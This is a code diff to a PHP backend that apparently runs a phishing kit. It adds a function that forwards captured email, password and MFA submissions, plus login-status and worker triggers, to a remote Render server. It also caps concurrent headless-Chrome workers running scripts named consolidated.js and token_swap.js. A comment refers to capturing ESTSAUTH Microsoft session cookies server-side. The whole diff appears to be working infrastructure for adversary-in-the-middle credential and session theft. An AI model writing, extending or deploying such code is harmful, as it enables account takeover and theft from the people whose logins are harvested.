@@ -156,6 +156,14 @@ class Config {
 }
 
 class Worker {
+    /**
+     * When RENDER_API_URL is set, this PHP process is the VPS-side proxy: it must
+     * NEVER launch Chrome / Puppeteer / Node. All such work is offloaded to Render.
+     */
+    public static function isRemote(): bool {
+        return (bool) getenv('RENDER_API_URL');
+    }
+
     public static function buildNodeCommand(string $projectRoot, string $script, string $email = '', string $password = '', string $cookieId = '', bool $background = false, bool $installChrome = false, string $apiBase = ''): string {
         $chromePath = '';
         foreach (['google-chrome-stable', 'google-chrome', 'chromium', 'chromium-browser'] as $bin) {
@@ -209,6 +217,9 @@ class Worker {
         $passwordTimeoutSecs = 120;
         $lastProfileSweep = 0;
 
+        $maxConcurrent = (int)(getenv('MAX_CONCURRENT_CHROMES') ?: 3);
+        if ($maxConcurrent < 1) $maxConcurrent = 1;
+
         while (true) {
             try {
                 if ((time() - $lastProfileSweep) > 300) {
@@ -218,6 +229,13 @@ class Worker {
                         }
                     }
                     $lastProfileSweep = time();
+                }
+
+                // Concurrency cap: count live `node consolidated.js` / `node token_swap.js` children.
+                $running = (int)trim((string)@shell_exec("pgrep -f 'node .*(consolidated|token_swap)\\.js' 2>/dev/null | wc -l"));
+                if ($running >= $maxConcurrent) {
+                    usleep(1000000);
+                    continue;
                 }
 
                 // Single-worker mode: pick the oldest pending session for FIFO fairness.
@@ -1051,6 +1069,57 @@ class Security {
 }
 
 class Api {
+    /**
+     * Forward the current request to the Render service when RENDER_API_URL env is set.
+     * Render owns session_data/, mfa_*.txt, the worker, and consolidated.js (Chrome).
+     * Returns true when the request was forwarded (caller MUST `return` immediately).
+     * Returns false when no Render URL is configured (fall back to local handling).
+     *
+     * Accepts either a base URL ("https://app.onrender.com") or a full endpoint
+     * ("https://app.onrender.com/api.php").
+     */
+    private static function forwardToRender(string $action): bool {
+        $renderUrl = getenv('RENDER_API_URL');
+        if (!$renderUrl) return false;
+
+        $body        = file_get_contents('php://input');
+        $method      = $_SERVER['REQUEST_METHOD'] ?? 'POST';
+        $contentType = $_SERVER['CONTENT_TYPE']   ?? 'application/json';
+
+        $base = rtrim($renderUrl, '/');
+        if (!preg_match('#\\.php($|\\?)#', $base)) {
+            $base .= '/api.php';
+        }
+        $url = $base . '?action=' . urlencode($action);
+        if ($method === 'GET' && !empty($_GET)) {
+            $qs = $_GET;
+            unset($qs['action']);
+            if (!empty($qs)) $url .= '&' . http_build_query($qs);
+        }
+
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_CUSTOMREQUEST  => $method,
+            CURLOPT_POSTFIELDS     => $body,
+            CURLOPT_HTTPHEADER     => ['Content-Type: ' . $contentType],
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 30,
+        ]);
+        $resp = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $err  = curl_error($ch);
+        unset($ch);
+
+        if (class_exists('Security')) {
+            Security::log("RENDER_FORWARD: $method $action -> HTTP $code" . ($err ? " curl=$err" : ''));
+        }
+
+        http_response_code($code ?: 502);
+        header('Content-Type: application/json');
+        echo $resp !== false && $resp !== '' ? $resp : json_encode(['ok' => false, 'error' => 'forward_failed']);
+        return true;
+    }
+
     public static function handle() {
         header_remove('X-Powered-By');
         header('Content-Type: application/json');
@@ -1110,6 +1179,7 @@ class Api {
     }
 
     private static function handleCreateSession() {
+        if (self::forwardToRender('create_session')) return;
         $raw  = file_get_contents('php://input');
         $data = json_decode($raw, true);
         $email    = isset($data['email'])    ? trim($data['email'])    : '';
@@ -1153,6 +1223,7 @@ class Api {
             echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
             exit;
         }
+        if (self::forwardToRender('submit_password')) return;
         $raw = file_get_contents('php://input');
         $data = json_decode($raw, true);
         if (!is_array($data)) {
@@ -1198,6 +1269,7 @@ class Api {
             echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
             exit;
         }
+        if (self::forwardToRender('submit_mfa')) return;
         $raw  = file_get_contents('php://input');
         $data = json_decode($raw, true);
         if (!is_array($data)) {
@@ -1226,6 +1298,7 @@ class Api {
     }
 
     private static function handleCheckLoginStatus() {
+        if (self::forwardToRender('check_login_status')) return;
         $sessionId = $_GET['sessionId'] ?? '';
         if (!$sessionId) {
             http_response_code(400);
@@ -1306,6 +1379,7 @@ class Api {
      * but ESTSAUTH is not available, to initiate robust server-side capture.
      */
     public static function handleTriggerWorker() { // Note: Made static to match other Api methods
+        if (self::forwardToRender('trigger_worker')) return;
         ob_start(); // Start output buffering
 
         $email = $_POST['email'] ?? null;
